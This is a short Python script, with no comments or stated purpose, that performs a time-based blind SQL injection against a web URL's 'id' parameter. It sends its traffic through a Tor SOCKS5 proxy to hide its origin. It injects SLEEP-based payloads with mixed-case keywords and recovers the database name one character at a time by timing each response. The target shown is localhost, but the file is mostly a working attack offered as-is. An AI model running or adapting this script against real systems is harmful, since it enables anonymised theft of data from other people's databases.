import os
import string
import sys
import collections
import time
import socks
import socket
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket
import requests

spec_ = '!@#$%&*?^.,-+='
dic_ = string.digits + string.ascii_letters
stt = ''
numm = 1
dic = string.ascii_letters
sqlf = 'database()'
url_ = """http://localhost/?id=1'"""
for a in range(5):
    for i in dic:
        pay = """ Or(if(mid(%s,1,%d)='%s%c',slEep(0.2),0))+--+""" % (sqlf, numm, stt, i)
        url = url_ + pay
        start = time.time()
        r = requests.post(url)
        stop = time.time()
        if stop - start > 1:
            stt +=i
            numm +=1
            print(sqlf,"=",stt)
            
